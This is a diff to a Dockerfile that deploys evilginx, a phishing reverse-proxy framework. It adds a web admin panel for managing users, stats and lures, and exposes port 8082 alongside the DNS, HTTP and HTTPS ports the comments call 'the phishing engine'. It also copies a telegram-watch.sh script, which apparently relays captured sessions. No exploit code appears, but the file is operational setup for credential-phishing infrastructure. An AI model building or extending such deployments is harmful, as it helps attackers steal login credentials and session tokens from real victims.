@@ -24,6 +24,11 @@ RUN addgroup -S evilginx && adduser -S evilginx -G evilginx
 
 COPY --from=builder /usr/local/bin/evilginx /usr/local/bin/evilginx
 COPY --from=builder /src/phishlets /usr/local/share/evilginx/phishlets
+
+# Web admin panel UI (login page, dashboard pages, css/js/img).
+# Served from WORKDIR /app, so it must live at /app/web/.
+COPY --from=builder /src/web /app/web
+
 COPY entrypoint.sh /entrypoint.sh
 COPY telegram-watch.sh /usr/local/bin/telegram-watch.sh
 RUN chmod +x /entrypoint.sh /usr/local/bin/telegram-watch.sh && \
@@ -34,8 +39,9 @@ RUN mkdir -p /app/phishlets /app/sessions /app/certs && \
     chown -R evilginx:evilginx /app
 
 # Entrypoint starts as root (fixes volume ownership), then drops to 'evilginx'
-# 53/80/443 = the phishing engine (DNS, HTTP, HTTPS)
-# 5000      = the web dashboard
-EXPOSE 53/udp 53/tcp 80/tcp 443/tcp 5000/tcp
+# 53/80/443  = the phishing engine (DNS, HTTP, HTTPS)
+# 5000       = the simple sessions dashboard
+# 8082       = the full web admin panel (login, users, stats, lures)
+EXPOSE 53/udp 53/tcp 80/tcp 443/tcp 5000/tcp 8082/tcp
 
 ENTRYPOINT ["/entrypoint.sh"]
